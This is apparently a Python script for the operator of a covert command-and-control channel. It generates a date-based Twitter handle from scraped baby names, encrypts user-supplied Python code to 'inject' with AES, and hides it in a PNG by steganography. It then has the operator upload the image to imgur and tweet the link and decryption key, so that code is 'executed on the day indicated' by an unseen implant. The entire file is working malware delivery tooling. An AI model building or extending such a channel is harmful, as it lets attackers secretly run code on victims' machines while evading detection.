from bs4 import BeautifulSoup
from urllib.request import urlopen
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from stegano import lsbset
from stegano.lsbset import generators
import random
import string

date = input("Enter a date in the following format: mm-dd-yyyy: \n")
day = int(date[3:5])
month = int(date[0:2])
year = int(date[6:10])


position = (day + month) * 3
if position > 100:
    position = position - 100

prestring = str(6 * month) + str(3 * day)

poststring = str(int((2 * year) / 3))

poslength = len(str(position))
offset = poslength + 2

page = urlopen('https://www.familyeducation.com/baby-names/top-names/boy')
soup = BeautifulSoup(page, 'html.parser')

for ul in soup.find_all('ul', class_='static-top-names part1'):
    line = ul.text

start = line.find(str(position) + '.')

if start < 0:
    for ul in soup.find_all('ul', class_='static-top-names part2'):
        line = ul.text

start = line.find(str(position) + '.')

start = start + offset
end = line.find('\n', start)
name = (line[start:end])

handle = prestring + name + poststring
print(handle)
wait = input("Please create twitter account with the handle presented")

file_name = input("Please enter the filename without file extension, please note that only PNG images are accepted and should be well below 5MB in order for imgur to keep it in PNG format:\n")
output_file_name = input("Please enter the desired output filename without file extension:\n")
no_lines_str = input("Please enter the number of lines of python code you wish to inject:\n")
no_lines = int(no_lines_str)
source = """"""
print("Please enter each line of code")
for x in range(no_lines):
    source += input() + "\n"
source = source.encode('ascii')
character_selection = string.ascii_letters + string.digits
key = ''.join(random.choice(character_selection) for i in range(10))
decoded_key = key
key = key.encode('ascii')

key = SHA256.new(key).digest()
IV = Random.new().read(AES.block_size)
encryptor = AES.new(key, AES.MODE_CBC, IV)
padding = AES.block_size - len(source) % AES.block_size
source += bytes([padding]) * padding
data = IV + encryptor.encrypt(source)
data_encrypted = base64.b64encode(data).decode("latin-1")

secret_image = lsbset.hide(file_name + ".png", data_encrypted, generators.eratosthenes())
secret_image.save(output_file_name + ".png")

imgur_link = input("Please upload the output file to imgur and enter its extension here: \n")
imgur_link_length = len(imgur_link)
middle = imgur_link_length

tweet_text=""

for x in range(imgur_link_length):
    if x == 3:
        tweet_text = tweet_text + decoded_key + " "
    elif x == 6:
        tweet_text = tweet_text + imgur_link[x]
        continue
    tweet_text = tweet_text + imgur_link[x] + " "
print("Please tweet the string shown below, the code will be executed on the day indictated \n")
print("Please also make sure the twitter url is the same as the handle generated")
print(tweet_text)

